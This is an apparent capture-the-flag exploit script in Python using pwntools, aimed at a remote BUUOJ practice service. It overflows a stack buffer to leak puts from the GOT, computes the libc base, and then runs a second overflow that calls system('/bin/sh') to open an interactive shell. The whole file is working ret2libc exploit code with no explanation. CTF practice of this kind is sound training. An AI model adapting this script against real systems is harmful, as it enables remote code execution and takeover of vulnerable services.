from pwn import *

context.log_level = 'debug'
# io = process('pwn')
io = remote('node3.buuoj.cn', 28842)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('pwn')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x08048825

io.sendline(b'\x00' * 7 + b'\xff')
payload = cyclic(0xEB) + p32(puts_plt) + p32(main_addr) + p32(puts_got)
io.sendlineafter('Correct\n', payload)
libc_base = u32(io.recvline()[:4]) - libc.symbols['puts']
log.success('libc_base: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

io.sendline(b'\x00' * 7 + b'\xff')
payload = cyclic(0xEB) + p32(system_addr) + cyclic(4) + p32(bin_sh_addr)
io.sendlineafter('Correct\n', payload)
io.interactive()

